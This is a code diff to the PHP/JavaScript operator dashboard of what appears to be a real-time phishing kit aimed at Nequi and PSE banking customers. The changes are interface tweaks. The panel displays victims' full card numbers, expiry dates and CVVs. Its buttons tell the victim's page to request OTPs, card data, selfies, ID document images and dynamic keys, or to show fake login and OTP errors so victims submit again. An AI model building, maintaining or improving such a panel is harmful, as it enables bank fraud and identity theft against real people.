@@ -391,34 +391,28 @@ require_once __DIR__ . '/auth.php';
         }
 
         /* Specific mini colors */
-        .act-whats {
-            background: #22c55e;
-            color: #000;
+        .act-whats { background: #16a34a; color: #fff; border: 1px solid #14532d; }
+        .act-sel { background: #7c3aed; border: 1px solid #5b21b6; }
+        .act-doc { background: #9333ea; border: 1px solid #6b21a8; }
+        .act-dyn { background: #d97706; color: #fff; border: 1px solid #92400e; }
+        
+        /* ERROR RED BUTTONS */
+        .btn-err {
+            background: #dc2626; /* Darker red */
+            color: white;
+            border: 1px solid #991b1b;
+            font-weight: 700;
         }
-
-        .act-sel {
-            background: #8b5cf6;
-        }
-
-        .act-doc {
-            background: #a855f7;
-        }
-
-        .act-dyn {
-            background: #f59e0b;
-            color: #000;
-        }
-
-        .act-err {
-            background: #f87171;
-        }
+        .btn-err:hover { background: #b91c1c; }
 
         .act-otp {
-            background: #38bdf8;
+            background: #0ea5e9;
+            color: white;
         }
 
         .act-cc {
-            background: #e879f9;
+            background: #c026d3;
+            color: white;
         }
 
         .act-sel {
@@ -576,6 +570,7 @@ require_once __DIR__ . '/auth.php';
         // --- CONSTANTS & STATE ---
         let currentFilter = 'all';
         let isUpdating = false;
+        let expandedCards = new Set(); // Track open dropdowns
 
         // --- UPDATE CLOCK ---
         setInterval(() => {
@@ -608,6 +603,8 @@ require_once __DIR__ . '/auth.php';
         // --- RENDER CARDS ---
         function renderCards(items) {
             const grid = document.getElementById('grid');
+            // Don't clear innerHTML immediately to verify diff if complex, 
+            // but for now we rebuild. We just need to check if ID is in expandedCards.
             grid.innerHTML = '';
             let hasActionRequired = false;
 
@@ -642,7 +639,7 @@ require_once __DIR__ . '/auth.php';
                     ([2, 4, 6, 10, 13, 14, 16].includes(parseInt(item.status_id)) ? 'st-err' : 'st-ok');
 
                 // Buttons Logic
-                const btns = getButtons(item.id, item.type);
+                const btns = getButtons(item.id, item.type, expandedCards.has(item.id));
 
                 card.innerHTML = `
                     <div class="card-header">
@@ -673,8 +670,11 @@ require_once __DIR__ . '/auth.php';
 
                         ${item.tarjeta ? `
                         <div class="data-row" style="margin-top:5px; border-top:1px dashed #444; padding-top:4px;">
-                            <span class="data-label">CC</span>
-                            <span class="data-val" style="color:#d8b4fe">${item.tarjeta} | ${item.fecha} | ${item.cvv}</span>
+                            <span class="data-label">CC/Fecha</span>
+                            <div style="text-align:right">
+                                <div class="data-val" style="color:#d8b4fe; font-size:0.9rem">${item.tarjeta}</div>
+                                <div class="data-val" style="color:#d8b4fe; font-size:0.8rem">${item.fecha} | ${item.cvv}</div>
+                            </div>
                         </div>` : ''}
                     </div>
 
@@ -684,7 +684,7 @@ require_once __DIR__ . '/auth.php';
                         ${item.status_text}
                     </div>
 
-                    <div class="actions-grid">
+                    <div class="actions-container">
                         ${btns}
                     </div>
 
@@ -709,70 +709,79 @@ require_once __DIR__ . '/auth.php';
 
         // --- BUTTONS BUILDER NEW DESIGN ---
         // --- BUTTONS BUILDER NEW DESIGN ---
-        function getButtons(id, type) {
+        // --- BUTTONS BUILDER NEW DESIGN ---
+        function getButtons(id, type, isOpen) {
             let b = '';
-
+            
             // Primary Actions (Always Visible)
             b += `<div class="btn-group-primary">`;
             if (type === 'nequi') {
-                b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
-                b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
+                 b += `<button class="btn-act act-otp" onclick="act(${id},'nequi',3)">Pedir OTP</button>`;
+                 b += `<button class="btn-act act-fin" onclick="act(${id},'nequi',0)">Finalizar</button>`;
             } else {
-                b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
-                b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
-                b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
+                 b += `<button class="btn-act act-otp" onclick="act(${id},'pse',3)">Pedir OTP</button>`;
+                 b += `<button class="btn-act act-cc" onclick="act(${id},'pse',5)">Pedir CC</button>`;
+                 b += `<button class="btn-act act-fin" onclick="act(${id},'pse',7)">Finalizar</button>`;
             }
             b += `</div>`;
 
             // Toggle Trigger
-            b += `<button class="btn-expand" onclick="toggleActions(this)">
-                    <i class="fas fa-chevron-down"></i> Más Opciones / Reportar Errores
+            const icon = isOpen ? 'fa-chevron-up' : 'fa-chevron-down';
+            const text = isOpen ? 'Menos Opciones' : 'Más Opciones / Errores';
+            const style = isOpen ? 'background:#333; color:#efefef;' : '';
+            
+            b += `<button class="btn-expand" onclick="toggleActions(this, ${id})" style="${style}">
+                    <i class="fas ${icon}"></i> ${text}
                   </button>`;
 
             // Hidden Secondary Actions
-            b += `<div class="actions-hidden" style="display:none; margin-top:10px;">`;
-
+            const display = isOpen ? 'block' : 'none';
+            b += `<div class="actions-hidden" style="display:${display}; margin-top:10px;">`;
+            
             // 1. Errors Section
-            b += `<div class="action-category"><span class="cat-title">⚠️ Errores</span><div class="btn-grid-mini">`;
-            if (type === 'nequi') {
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',2)">Login</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',4)">OTP</button>`;
-            } else {
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',2)">Login</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',4)">OTP</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',6)">CC</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',10)">Selfie</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',13)">Doc F.</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',14)">Doc R.</button>`;
-                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',16)">Reloj</button>`;
+            b += `<div class="action-category"><span class="cat-title">⚠️ Reportar Errores (Rojo)</span><div class="btn-grid-mini">`;
+            if (type === 'nequi') { // Nequi Errors
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',2)">Err Login</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'nequi',4)">Err OTP</button>`;
+            } else { // PSE Errors
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',2)">Err Login</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',4)">Err OTP</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',6)">Err CC</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',10)">Err Selfie</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',13)">Err Doc F.</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',14)">Err Doc R.</button>`;
+                b += `<button class="btn-mini btn-err" onclick="act(${id},'pse',16)">Err Reloj</button>`;
             }
             b += `</div></div>`;
 
             // 2. Extra Requests
             if (type !== 'nequi') {
-                b += `<div class="action-category"><span class="cat-title">📡 Solicitar</span><div class="btn-grid-mini">`;
+                b += `<div class="action-category"><span class="cat-title">📡 Solicitar Datos (Color)</span><div class="btn-grid-mini">`;
                 b += `<button class="btn-mini act-whats" onclick="act(${id},'pse',8)">WhatsApp</button>`;
-                b += `<button class="btn-mini act-sel" onclick="act(${id},'pse',9)">Selfie</button>`;
-                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',11)">Doc F.</button>`;
-                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',12)">Doc R.</button>`;
-                b += `<button class="btn-mini act-dyn" onclick="act(${id},'pse',15)">Reloj</button>`;
-                b += `</div></div>`;
+                b += `<button class="btn-mini act-sel" onclick="act(${id},'pse',9)">Pedir Selfie</button>`;
+                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',11)">Doc Frente</button>`;
+                b += `<button class="btn-mini act-doc" onclick="act(${id},'pse',12)">Doc Reverso</button>`;
+                b += `<button class="btn-mini act-dyn" onclick="act(${id},'pse',15)">Pedir Reloj</button>`;
             }
 
-            b += `</div>`; // End hidden
+            b += `</div></div>`; // End hidden
             return b;
         }
 
-        function toggleActions(btn) {
+        function toggleActions(btn, id) {
             const container = btn.nextElementSibling;
             if (container.style.display === 'none') {
                 container.style.display = 'block';
                 btn.innerHTML = '<i class="fas fa-chevron-up"></i> Menos Opciones';
                 btn.style.background = '#333';
+                btn.style.color = '#efefef';
+                expandedCards.add(id);
             } else {
                 container.style.display = 'none';
-                btn.innerHTML = '<i class="fas fa-chevron-down"></i> Más Opciones / Reportar Errores';
+                btn.innerHTML = '<i class="fas fa-chevron-down"></i> Más Opciones / Errores';
                 btn.style.background = 'transparent';
+                btn.style.color = '#888';
+                expandedCards.delete(id);
             }
         }
 
